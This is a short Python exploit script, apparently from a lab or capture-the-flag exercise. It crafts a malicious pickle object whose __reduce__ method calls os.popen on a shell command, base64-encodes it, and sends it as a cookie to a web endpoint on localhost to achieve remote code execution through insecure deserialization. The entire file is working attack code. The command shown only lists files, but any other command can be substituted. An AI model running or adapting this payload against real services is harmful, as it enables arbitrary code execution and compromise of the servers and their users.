from requests import post,get
from pickle import dumps
from os import popen
from base64 import b64encode
 
url='http://localhost:4000/cookie'
shell_cmd='/bin/ls > ls_out'
proto_ver=2

class Payload(object):
    def __reduce__(self):
        return (popen, ((shell_cmd),))

cookies = {
    'value': b64encode(dumps(Payload(),protocol=proto_ver)).decode('utf-8')
}

print('send GET\nshell_cmd = \''+shell_cmd+'\'\nurl = '+url)
print('cookies =',cookies)
p = get(url, cookies=cookies)
if p.status_code==200:
	print('success')
else:
	print('failed, status_code =',p.status_code)